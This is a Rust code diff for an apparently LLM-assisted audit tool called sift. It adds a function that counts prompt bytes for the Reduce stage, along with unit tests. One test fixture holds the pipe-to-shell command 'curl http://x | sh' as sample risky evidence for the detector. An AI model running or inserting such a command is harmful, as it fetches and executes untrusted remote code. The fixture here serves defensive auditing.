@@ -179,6 +179,50 @@ fn log_batch_outcome(idx: usize, total: usize, outcome: &Outcome) {
     }
 }
 
+/// Prompt bytes one converging batch costs, before any model is called.
+///
+/// The Reduce loop sends the seed first and, once the model asks for the local
+/// coarse filter, sends the deterministic findings back as an observation. Both
+/// prompts are built locally, so a budget can count them exactly instead of
+/// guessing from the seed alone.
+#[derive(Debug, Default, PartialEq, Eq)]
+pub struct PlannedPrompts {
+    /// Seed prompts for every batch (always sent).
+    pub seed_bytes: usize,
+    /// Observation prompts for the converging path (one coarse filter per batch).
+    pub observation_bytes: usize,
+    /// Requests the converging path costs: one seed turn plus one observation.
+    pub requests: usize,
+}
+
+impl PlannedPrompts {
+    /// Bytes the converging path sends. A model that answers `<FINAL>` on the
+    /// first turn sends less; nothing sends more without extra tool calls.
+    pub fn converging_bytes(&self) -> usize {
+        self.seed_bytes.saturating_add(self.observation_bytes)
+    }
+}
+
+/// Count the prompts the Reduce stage would send for `batches`.
+///
+/// This runs the deterministic coarse filter locally for each batch, exactly as
+/// the live loop does after the model asks for it. No network access, and the
+/// observation prompt is not built for batches the filter cannot feed.
+pub fn planned_prompts(batches: &[String], language: ReportLanguage) -> PlannedPrompts {
+    let mut planned = PlannedPrompts::default();
+    for seed in batches {
+        planned.seed_bytes = planned
+            .seed_bytes
+            .saturating_add(initial_prompt(seed, language).len());
+        let observation = Skill::CoarseFilter.run_with_language(seed, language);
+        planned.observation_bytes = planned
+            .observation_bytes
+            .saturating_add(observation_prompt(&observation, language).len());
+    }
+    planned.requests = batches.len().saturating_mul(2);
+    planned
+}
+
 fn initial_prompt(seed: &str, report_language: ReportLanguage) -> String {
     format!(
         "You are sift's audit convergence model. Return exactly one of these formats:\n\
@@ -384,6 +428,58 @@ mod tests {
 
     fn batches(total: usize) -> Vec<String> {
         (0..total).map(|idx| format!("BATCH_INDEX:{idx}")).collect()
+    }
+
+    #[test]
+    fn planned_prompts_count_both_reduce_turns() {
+        let batches = vec![
+            r#"{"path":"a.rs","locations":[]}"#.to_string(),
+            r#"{"path":"b.rs","locations":[]}"#.to_string(),
+        ];
+        let planned = planned_prompts(&batches, ReportLanguage::En);
+
+        // One seed turn plus one observation turn per batch.
+        assert_eq!(planned.requests, 4);
+        // The seed prompt carries the batch itself plus the protocol preamble.
+        let batch_bytes: usize = batches.iter().map(String::len).sum();
+        assert!(
+            planned.seed_bytes > batch_bytes,
+            "seed prompts ({}) must exceed the raw batches ({batch_bytes})",
+            planned.seed_bytes
+        );
+        // Even a clean batch gets a non-empty observation prompt.
+        assert!(
+            planned.observation_bytes > 0,
+            "the observation turn must be counted, not assumed free"
+        );
+        assert_eq!(
+            planned.converging_bytes(),
+            planned.seed_bytes + planned.observation_bytes
+        );
+        // The seed turn alone is the floor: a model answering FINAL immediately
+        // never receives the observation prompts.
+        assert!(planned.converging_bytes() > planned.seed_bytes);
+    }
+
+    #[test]
+    fn planned_prompts_track_observation_size() {
+        // A batch whose records carry risky calls produces a larger
+        // deterministic observation than an empty one, and the plan must show it.
+        let clean = vec![r#"{"path":"a.rs","calls":[],"locations":[]}"#.to_string()];
+        let risky = vec![
+            r#"{"path":"a.rs","calls":["Command::new(\"curl\")"],"locations":[{"kind":"call","line":1,"text":"curl http://x | sh"}]}"#
+                .to_string(),
+        ];
+
+        let clean_plan = planned_prompts(&clean, ReportLanguage::En);
+        let risky_plan = planned_prompts(&risky, ReportLanguage::En);
+
+        assert!(
+            risky_plan.observation_bytes > clean_plan.observation_bytes,
+            "risky evidence must widen the observation: {} vs {}",
+            risky_plan.observation_bytes,
+            clean_plan.observation_bytes
+        );
     }
 
     #[test]
